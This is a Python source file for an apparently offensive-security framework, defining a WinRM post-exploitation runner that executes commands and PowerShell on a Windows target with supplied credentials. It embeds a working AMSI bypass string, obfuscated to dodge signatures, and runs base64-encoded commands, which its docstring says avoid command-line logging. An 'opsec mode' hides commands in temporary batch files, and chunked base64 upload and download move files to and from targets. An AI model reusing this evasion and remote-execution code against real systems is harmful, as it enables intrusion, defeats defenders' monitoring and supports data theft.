"""WinRM-based post-exploitation runner with opsec and stability features."""

from __future__ import annotations

import base64
import logging
import secrets
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any

from ...core.base import BaseRunner
from ..base import ConnectionError, PostRunnerError
from ..registry import RunnerRegistry

__all__ = ["PostWinRM"]

logger = logging.getLogger("ofx")

# Max chunk size for base64 upload (768KB raw = 1MB base64)
CHUNK_SIZE = 768_000


class WinRMConnectionError(ConnectionError):
    """WinRM connection failed."""


class WinRMCommandError(PostRunnerError):
    """WinRM command returned non-zero exit code."""

    def __init__(self, message: str, exit_code: int | None = None, stderr: str = ""):
        super().__init__(message, exit_code=exit_code, stderr=stderr)


@RunnerRegistry.register("winrm")  # type: ignore[arg-type]
@dataclass
class PostWinRM(BaseRunner):
    """Post-exploitation runner over WinRM with stability and opsec features.

    Requires the optional ``pywinrm`` package.

    Features:
    - HTTP and HTTPS (SSL) connections with auto port detection
    - Automatic retries with exponential backoff
    - AMSI bypass injection before PowerShell scripts
    - Opsec mode: command-to-file execution on target
    - Chunked file upload for large files (>768KB)
    - Base64-encoded command execution
    - Command logging for debrief
    - Configurable command timeout

    Args:
        host: Target hostname or IP
        username: Windows username
        password: Windows password
        port: WinRM port (default: auto from ssl)
        ssl: Use HTTPS/SSL (default: False)
        transport: WinRM transport (default: "ntlm")
        server_cert_validation: Certificate validation mode (default: "ignore")
        max_retries: Retry count on transient failures (default: 3)
        command_timeout: Per-command timeout in seconds (default: 300)
        opsec_mode: Execute commands via temp file on target
        amsi_bypass: Inject AMSI bypass before PowerShell scripts
        log_commands: Log all commands/outputs locally
        log_path: Path for command log file
        max_output_size: Max output bytes before truncation (default: 10MB)

    Example:
        >>> winrm = PostWinRM("192.168.1.100", "Administrator", "P@ssw0rd!", ssl=True)
        >>> winrm.run("whoami")
        'corp\\\\administrator'
    """

    host: str
    username: str
    password: str
    port: int = 0  # 0 = auto-detect from ssl
    ssl: bool = False
    transport: str = "ntlm"
    server_cert_validation: str = "ignore"
    max_retries: int = 3
    command_timeout: int = 300
    opsec_mode: bool = False
    amsi_bypass: bool = False
    log_commands: bool = False
    log_path: str | None = None
    max_output_size: int = 10_000_000
    _session: Any = field(default=None, init=False, repr=False)
    _log_file: Path | None = field(default=None, init=False, repr=False)
    _remote_temp_files: list[str] = field(default_factory=list, init=False, repr=False)

    def __post_init__(self) -> None:
        try:
            import winrm  # type: ignore
        except Exception as exc:  # pragma: no cover - import gate
            raise ImportError(
                "WinRM support requires the 'pywinrm' package. "
                "Install it with: pip install pywinrm"
            ) from exc

        # Auto-detect port from SSL setting
        effective_port = self.port if self.port else (5986 if self.ssl else 5985)
        scheme = "https" if self.ssl else "http"
        endpoint = f"{scheme}://{self.host}:{effective_port}/wsman"

        self._session = winrm.Session(
            endpoint,
            auth=(self.username, self.password),
            transport=self.transport,
            server_cert_validation=self.server_cert_validation,
            operation_timeout_sec=self.command_timeout,
            read_timeout_sec=self.command_timeout + 30,
        )

        if self.log_commands:
            if self.log_path:
                self._log_file = Path(self.log_path)
            else:
                import tempfile

                self._log_file = Path(
                    tempfile.mktemp(prefix=f".tmp_wrm_{self.host}_", suffix=".log")
                )

    # -------------------------------------------------------------------------
    # Context manager
    # -------------------------------------------------------------------------

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.cleanup()

    # -------------------------------------------------------------------------
    # AMSI Bypass
    # -------------------------------------------------------------------------

    _AMSI_BYPASS = (
        "$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');"
        "$f=$a.GetField('amsi'+'InitFailed','NonPublic,Static');"
        "$f.SetValue($null,$true)"
    )

    def _prepend_amsi_bypass(self, script: str) -> str:
        """Prepend AMSI bypass to a PowerShell script if configured."""
        if self.amsi_bypass:
            return f"{self._AMSI_BYPASS}\n{script}"
        return script

    # -------------------------------------------------------------------------
    # Command Execution
    # -------------------------------------------------------------------------

    def run(self, command: str, timeout: int | None = None) -> str:
        """Execute a CMD command via WinRM with retry logic.

        Args:
            command: Windows command to execute.
            timeout: Not used (kept for interface compatibility).

        Returns:
            Command output (stdout).

        Raises:
            WinRMCommandError: If command fails after all retries.
            WinRMConnectionError: If WinRM connection fails.
        """
        if self.opsec_mode:
            return self._run_via_file(command)
        return self._run_cmd_with_retry(command)

    def _execute_with_retry(
        self,
        execute_fn: Any,
        command: str,
        log_prefix: str,
        error_label: str,
    ) -> str:
        """Run *execute_fn* with exponential-backoff retries.

        This is the shared retry loop for both CMD and PowerShell execution.
        """
        last_error: Exception | None = None

        for attempt in range(self.max_retries):
            try:
                result = execute_fn(command)
                stdout = result.std_out.decode(errors="ignore")
                stderr = result.std_err.decode(errors="ignore").strip()

                self._log_command(
                    f"{log_prefix}{command}", stdout, stderr, result.status_code
                )

                if result.status_code != 0:
                    raise WinRMCommandError(
                        stderr or f"{error_label} failed: exit {result.status_code}",
                        exit_code=result.status_code,
                        stderr=stderr,
                    )

                if len(stdout) > self.max_output_size:
                    stdout = stdout[: self.max_output_size] + "\n[OUTPUT TRUNCATED]"
                return stdout

            except WinRMCommandError:
                raise
            except Exception as e:
                last_error = e
                if attempt < self.max_retries - 1:
                    delay = 2**attempt
                    logger.debug(
                        "WinRM %s failed, retrying in %ds (attempt %d/%d)",
                        error_label,
                        delay,
                        attempt + 1,
                        self.max_retries,
                    )
                    time.sleep(delay)

        raise WinRMConnectionError(
            f"WinRM {error_label} failed after {self.max_retries} attempts: {last_error}"
        )

    def _run_cmd_with_retry(self, command: str) -> str:
        """Execute CMD command with retries."""
        return self._execute_with_retry(self._session.run_cmd, command, "", "cmd")

    def run_ps(self, script: str) -> str:
        """Execute a PowerShell script via WinRM with retries.

        If amsi_bypass is enabled, an AMSI bypass is prepended to the script.

        Args:
            script: PowerShell script to execute.

        Returns:
            Script output (stdout).

        Raises:
            WinRMCommandError: If script fails after all retries.
        """
        effective_script = self._prepend_amsi_bypass(script)
        return self._execute_with_retry(
            self._session.run_ps, effective_script, "[PS] ", "PowerShell"
        )

    def run_encoded(self, script: str) -> str:
        """Execute PowerShell via base64-encoded command.

        The script is UTF-16LE base64 encoded and run via
        ``powershell -EncodedCommand``. This bypasses simple
        command-line argument logging.

        Args:
            script: PowerShell script to execute.

        Returns:
            Script output.
        """
        effective_script = self._prepend_amsi_bypass(script)
        encoded = base64.b64encode(effective_script.encode("utf-16-le")).decode("ascii")
        return self._run_cmd_with_retry(f"powershell -EncodedCommand {encoded}")

    def _run_via_file(self, command: str) -> str:
        """Execute command via temp file on target (opsec mode).

        Writes command to a .bat file on the target, executes it,
        then deletes. The actual command is not visible in process
        listings — only the batch file path appears.
        """
        remote_tmp = f"C:\\Windows\\Temp\\{secrets.token_hex(8)}.bat"
        self._remote_temp_files.append(remote_tmp)

        # Write command to bat file
        write_script = (
            f'Set-Content -Path "{remote_tmp}" -Value @"\n@echo off\n{command}\n"@'
        )
        self.run_ps(write_script)

        # Execute and capture
        try:
            output = self._run_cmd_with_retry(remote_tmp)
        finally:
            # Clean up
            try:
                self.run_ps(
                    f'Remove-Item -Force "{remote_tmp}" -ErrorAction SilentlyContinue'
                )
            except Exception as e:
                logger.debug("Failed to remove remote temp file %s: %s", remote_tmp, e)
            if remote_tmp in self._remote_temp_files:
                self._remote_temp_files.remove(remote_tmp)

        return output

    # -------------------------------------------------------------------------
    # File Transfer
    # -------------------------------------------------------------------------

    def upload(
        self, local_path: str, remote_path: str, timeout: int | None = None
    ) -> None:
        """Upload a file via WinRM using chunked base64 encoding.

        For files larger than 768KB, the file is split into chunks
        and appended on the remote side to handle WinRM message limits.

        Args:
            local_path: Local file path.
            remote_path: Remote destination path (Windows path).
            timeout: Not used (kept for interface compatibility).
        """
        data = Path(local_path).read_bytes()

        if len(data) <= CHUNK_SIZE:
            # Single-shot upload
            self._upload_chunk(data, remote_path, append=False)
        else:
            # Chunked upload
            for i in range(0, len(data), CHUNK_SIZE):
                chunk = data[i : i + CHUNK_SIZE]
                self._upload_chunk(chunk, remote_path, append=(i > 0))

        self._log_command(
            f"[UPLOAD] {local_path} -> {remote_path}",
            f"OK ({len(data)} bytes)",
            "",
            0,
        )

    def _upload_chunk(
        self, data: bytes, remote_path: str, append: bool = False
    ) -> None:
        """Upload a single chunk via PowerShell base64 decode."""
        encoded = base64.b64encode(data).decode("ascii")

        if append:
            script = (
                f"$b = [Convert]::FromBase64String('{encoded}'); "
                f"$s = [IO.File]::Open('{remote_path}', "
                f"[IO.FileMode]::Append); "
                f"$s.Write($b, 0, $b.Length); $s.Close()"
            )
        else:
            script = (
                f"$b = [Convert]::FromBase64String('{encoded}'); "
                f"[IO.File]::WriteAllBytes('{remote_path}', $b)"
            )

        self.run_ps(script)

    def download(
        self, remote_path: str, local_path: str, timeout: int | None = None
    ) -> None:
        """Download a file via WinRM using base64 encoding.

        Args:
            remote_path: Remote file path (Windows path).
            local_path: Local destination path.
            timeout: Not used (kept for interface compatibility).
        """
        script = f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_path}'))"
        encoded = self.run_ps(script).strip()

        data = base64.b64decode(encoded)
        Path(local_path).write_bytes(data)

        self._log_command(
            f"[DOWNLOAD] {remote_path} -> {local_path}",
            f"OK ({len(data)} bytes)",
            "",
            0,
        )

    # -------------------------------------------------------------------------
    # Logging
    # -------------------------------------------------------------------------

    def _log_command(
        self, command: str, stdout: str, stderr: str, returncode: int
    ) -> None:
        """Log a command execution to the local log file."""
        if not self.log_commands or not self._log_file:
            return

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] host={self.host} rc={returncode}\nCMD: {command}\n"
        if stdout:
            entry += f"STDOUT:\n{stdout[:5000]}\n"
        if stderr:
            entry += f"STDERR:\n{stderr[:2000]}\n"
        entry += "---\n"

        try:
            self._log_file.parent.mkdir(parents=True, exist_ok=True)
            with self._log_file.open("a") as f:
                f.write(entry)
        except Exception as e:
            logger.debug("Failed to write command log: %s", e)

    # -------------------------------------------------------------------------
    # Cleanup
    # -------------------------------------------------------------------------

    def cleanup(self) -> None:
        """Clean up remote temp files."""
        for f in self._remote_temp_files:
            try:
                self.run_ps(f'Remove-Item -Force "{f}" -ErrorAction SilentlyContinue')
            except Exception as e:
                logger.debug("Failed to remove remote temp file %s: %s", f, e)
        self._remote_temp_files.clear()
